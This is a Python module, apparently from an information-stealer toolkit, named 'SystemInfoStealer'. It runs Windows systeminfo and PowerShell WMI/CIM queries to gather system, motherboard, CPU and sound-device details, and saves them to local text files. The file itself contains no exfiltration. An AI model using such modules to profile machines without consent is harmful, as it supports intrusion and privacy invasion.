import os
import subprocess

from config.manager import ModuleManager


class SystemInfoRecovery(ModuleManager):
    def __init__(self) -> None:
        super().__init__(module_name = "SystemInfoStealer")
        
        self.banner(r"""
         _______          ______                              
        |.-----.|        / _____)             _               
        ||x . x||       ( (____  _   _  ___ _| |_ _____ ____  
        ||_.-._||        \____ \| | | |/___|_   _) ___ |    \ 
        `--)-(--`        _____) ) |_| |___ | | |_| ____| | | |
       __[=== o]___     (______/ \__  (___/   \__)_____)_|_|_|
      |:::::::::::|\            (____/                        
      `-=========-`()                Information
                    """)

        self.systeminfo_folder = os.path.join(self.output_folder_user, 'system')
        self.systeminfo_filename = os.path.join(self.systeminfo_folder, 'systeminfo.txt')
        self.computerinfo_filename = os.path.join(self.systeminfo_folder, 'computerinfo.txt')
        self.motherboard_filename = os.path.join(self.systeminfo_folder, 'motherboard.txt')
        self.cpu_filename = os.path.join(self.systeminfo_folder, 'cpu.txt')
        self.sounds_filename = os.path.join(self.systeminfo_folder, 'sounds.txt')

        if not os.path.isdir(self.systeminfo_folder):
            os.makedirs(self.systeminfo_folder)
            
    def systeminfo(self) -> None:
        self.mdebug("[systeminfo] Running command: `systeminfo`")
        data = subprocess.check_output(['systeminfo']).decode('utf-8', errors="backslashreplace")
        with open(self.systeminfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[systeminfo] Saved result to {self.systeminfo_filename}")
    
    def computerinfo(self) -> None:
        self.mdebug("[computerinfo] Running command: `powershell Get-ComputerInfo`")
        data = subprocess.check_output(['powershell', "Get-ComputerInfo"]).decode('utf-8', errors="backslashreplace")
        with open(self.computerinfo_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[computerinfo] Saved result to {self.computerinfo_filename}")
    
    def motherboard(self) -> None:
        self.mdebug("[motherboard] Running command: `powershell Get-WmiObject win32_baseboard`")
        data = subprocess.check_output(['powershell', "Get-WmiObject win32_baseboard"]).decode('utf-8', errors="backslashreplace")
        with open(self.motherboard_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[motherboard] Saved result to {self.motherboard_filename}")
    
    def cpu(self) -> None:
        self.mdebug("[cpu] Running command: `powershell Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property [a-z]*`")
        data = subprocess.check_output(['powershell', "Get-WmiObject -Class Win32_Processor -ComputerName. | Select-Object -Property [a-z]*"]).decode('utf-8', errors="backslashreplace")
        with open(self.cpu_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[cpu] Saved result to {self.cpu_filename}")
    
    def sound(self) -> None:
        self.mdebug("[motherboard] Running command: `powershell Get-CimInstance win32_sounddevice | fl *`")
        data = subprocess.check_output(['powershell', "Get-CimInstance win32_sounddevice | fl *"]).decode('utf-8', errors="backslashreplace")
        with open(self.sounds_filename, 'w', encoding='utf-8') as _file:
            _file.write(data)
            self.mprint(f"[sound] Saved result to {self.sounds_filename}")

    def run(self) -> None:
        __funcs__ = (
            'systeminfo', 'computerinfo', 
            'motherboard', 'cpu', 'sound'
        )
        
        for func_name in __funcs__:
            try:
                self.mdebug(f"Running function `{func_name}()`")
                func = getattr(self, func_name)
                func()
            except (FileNotFoundError, subprocess.CalledProcessError):
                self.merror(f"[{func_name}] Unable to run `{func_name}()`")
            except Exception as e:
                self.merror(f"[{func_name}] Unable to run `{func_name}()` -> {e}")
        